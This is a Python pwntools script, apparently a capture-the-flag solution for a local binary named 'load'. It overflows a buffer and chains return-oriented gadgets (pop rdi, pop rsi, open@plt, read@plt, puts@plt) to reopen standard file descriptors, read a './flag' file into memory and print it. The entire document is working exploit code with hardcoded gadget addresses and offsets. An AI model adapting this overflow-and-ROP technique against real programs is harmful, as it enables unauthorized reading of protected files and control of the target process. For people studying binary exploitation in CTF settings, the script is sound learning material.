#! /usr/bin/python
from pwn import *

r = process('./load')
context.log_level = 'debug'
#gdb.attach(r,'b* 0x000040089D') #0x0400 8a8 966


payload1 = '/proc/self/fd/0' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += './flag' + '\x00'
r.sendlineafter('Input file name: ',payload1)

r.sendlineafter('Input offset: ','0')
r.sendlineafter('Input size: ','400')

string = 0x0601040

payload2 = 'A'*0x38 # dummy
## open('/proc/self/fd/0',0,)
for i in range(0,3):
	payload2 += p64(0x00400a73) #0x0000000000400a73 : pop rdi ; ret 
	payload2 += p64(string + 0x10 + 0x09*i)
	payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
	payload2 += p64(0x02)
	payload2 += p64(0x00)
	payload2 += p64(0x0400710) # open@plt  rdx is very biggg!

payload2 += p64(0x00400a73) # pop rdi; ret
payload2 += p64(0x060106b) # flag string
payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
payload2 += p64(0x00)
payload2 += p64(0x00)
payload2 += p64(0x0400710) # open@plt  rdx is very biggg!

payload2 += p64(0x00400a73) # pop rdi; ret
payload2 += p64(0x03) # fd 3 
payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
payload2 += p64(0x0601f00) # bss
payload2 += p64(0x00)
payload2 += p64(0x000004006E8) # read@plt

payload2 += p64(0x00400a73) # pop rdi; ret
payload2 += p64(0x0601f00) # bss
payload2 += p64(0x000004006C0) # puts@plt

r.sendline(payload2)






r.interactive()
